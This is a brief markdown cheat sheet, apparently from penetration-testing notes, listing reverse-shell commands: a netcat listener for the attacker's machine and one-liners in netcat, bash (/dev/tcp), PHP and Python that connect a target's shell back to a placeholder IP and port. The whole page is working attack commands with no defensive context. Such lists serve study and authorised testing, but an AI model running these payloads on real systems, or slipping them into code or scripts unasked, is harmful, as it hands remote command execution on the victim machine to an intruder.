# Reverse shell

On host:

```bash
nc -lvnp <port>
```

General options on target:

```bash
nc <ip> <port> -c bash
```

```bash
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

```php
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0>&1’”); phpinfo(); ?>
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

See [upgrade-dumb-shell](upgrade-dumb-shell.md) for upgrading.